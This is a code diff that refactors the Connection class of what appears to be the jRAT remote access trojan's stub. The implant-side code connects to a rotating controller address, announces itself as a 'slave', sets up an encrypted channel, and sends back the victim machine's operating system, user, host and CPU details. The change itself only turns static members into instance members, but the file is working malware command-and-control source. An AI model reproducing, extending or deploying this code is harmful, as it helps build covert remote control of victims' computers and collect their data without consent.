@@ -42,25 +42,23 @@ import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 
 public class Connection implements Runnable {
 	
-	public static Socket socket;
-	public static boolean busy = false;
-	public static FrameChat frameChat;
-
-	public static InputStream inputStream;
-	public static OutputStream outputStream;
-
-	public static DataInputStream dis;
-	public static DataOutputStream dos;
-
-	public static PublicKey pubKey;
+	public static Connection instance;
 	
-	public static final StringWriter sw = new StringWriter() {
-		@Override
-		public void writeLine(String s) throws Exception {
-			Connection.writeLine(s);
-		}
-	};
+	private Socket socket;
+	private FrameChat frameChat;
 
+	private InputStream inputStream;
+	private OutputStream outputStream;
+
+	private DataInputStream dis;
+	private DataOutputStream dos;
+
+	public PublicKey pubKey;
+	
+	public Connection() {
+		instance = this;
+	}
+	
 	public void run() {
 		try {
 			Address address = DnsRotator.getNextAddress();
@@ -69,11 +67,11 @@ public class Connection implements Runnable {
 
 			socket.setSoTimeout(Configuration.timeout);
 
-			Connection.inputStream = socket.getInputStream();
-			Connection.outputStream = socket.getOutputStream();
+			this.inputStream = socket.getInputStream();
+			this.outputStream = socket.getOutputStream();
 
-			Connection.dis = new DataInputStream(inputStream);
-			Connection.dos = new DataOutputStream(outputStream);
+			this.dis = new DataInputStream(inputStream);
+			this.dos = new DataOutputStream(outputStream);
 	        
 			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
 			
@@ -97,11 +95,11 @@ public class Connection implements Runnable {
 			Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, iv);
 			Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
 			
-			Connection.inputStream = new CipherInputStream(socket.getInputStream(), inCipher);
-			Connection.outputStream = new CipherOutputStream(socket.getOutputStream(), outCipher);
+			this.inputStream = new CipherInputStream(socket.getInputStream(), inCipher);
+			this.outputStream = new CipherOutputStream(socket.getOutputStream(), outCipher);
 
-			Connection.dis = new DataInputStream(inputStream);
-			Connection.dos = new DataOutputStream(outputStream);
+			this.dis = new DataInputStream(inputStream);
+			this.dos = new DataOutputStream(outputStream);
 
 			initialize();
 
@@ -115,7 +113,7 @@ public class Connection implements Runnable {
 				byte line = readByte();
 
 				if (line == 0) {
-					Connection.writeByte(0);
+					this.writeByte(0);
 					continue;
 				}
 				
@@ -132,13 +130,13 @@ public class Connection implements Runnable {
 		}
 	}
 
-	public static void initialize() throws Exception {
+	public void initialize() throws Exception {
 		addToSendQueue(new Packet1InitHandshake());	
 		refreshInit();		
 		addToSendQueue(new Packet3Initialized());
 	}
 	
-	public static void refreshInit() {
+	public void refreshInit() {
 		addToSendQueue(new Packet4InitOperatingSystem());
 		addToSendQueue(new Packet5InitUserHost());	
 		addToSendQueue(new Packet6InitVersion());
@@ -157,11 +155,11 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet19InitCPU());
 	}
 
-	public static synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
-		packet.send(dos, sw);
+	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
+		packet.send(dos, getStringWriter());
 	}
 
-	public static void writeLine(String s) {
+	public void writeLine(String s) {
 		if (s == null) {
 			Main.debug("String is null!");
 			s = "";
@@ -174,7 +172,7 @@ public class Connection implements Runnable {
 		}
 	}
 
-	public static String readLine() {
+	public String readLine() {
 		try {
 			short len = dis.readShort();
 
@@ -192,51 +190,80 @@ public class Connection implements Runnable {
 		}
 	}
 
-	public static void writeShort(short i) throws Exception {
+	public void writeShort(short i) throws Exception {
 		dos.writeShort(i);
 	}
 
-	public static short readShort() throws Exception {
+	public short readShort() throws Exception {
 		return dis.readShort();
 	}
 
-	public static byte readByte() throws Exception {
+	public byte readByte() throws Exception {
 		return dis.readByte();
 	}
 
-	public static void writeByte(int b) throws Exception {
+	public void writeByte(int b) throws Exception {
 		dos.writeByte(b);
 	}
 
-	public static boolean readBoolean() throws Exception {
+	public boolean readBoolean() throws Exception {
 		return dis.readBoolean();
 	}
 
-	public static void writeBoolean(boolean b) throws Exception {
+	public void writeBoolean(boolean b) throws Exception {
 		dos.writeBoolean(b);
 	}
 
-	public static int readInt() throws Exception {
+	public int readInt() throws Exception {
 		return dis.readInt();
 	}
 
-	public static void writeInt(int i) throws Exception {
+	public void writeInt(int i) throws Exception {
 		dos.writeInt(i);
 	}
 
-	public static long readLong() throws Exception {
+	public long readLong() throws Exception {
 		return dis.readLong();
 	}
 
-	public static void writeLong(long l) throws Exception {
+	public void writeLong(long l) throws Exception {
 		dos.writeLong(l);
 	}
 
-	public static void writeLine(Object obj) throws Exception {
+	public void writeLine(Object obj) throws Exception {
 		writeLine(obj.toString());
 	}
 
-	public static void status(int status) {
+	public void status(int status) {
 		addToSendQueue(new Packet2Status(status));
+	}
+	
+	public DataInputStream getDataInputStream() {
+		return dis;
+	}
+	
+	public DataOutputStream getDataOutputStream() {
+		return dos;
+	}
+	
+	public void setFrameChat(FrameChat frame) {
+		this.frameChat = frame;
+	}
+	
+	public FrameChat getFrameChat() {
+		return this.frameChat;
+	}
+
+	public Socket getSocket() {
+		return this.socket;
+	}
+	
+	public StringWriter getStringWriter() {
+		return new StringWriter() {
+			@Override
+			public void writeLine(String s) throws Exception {
+				Connection.this.writeLine(s);
+			}
+		};
 	}
 }
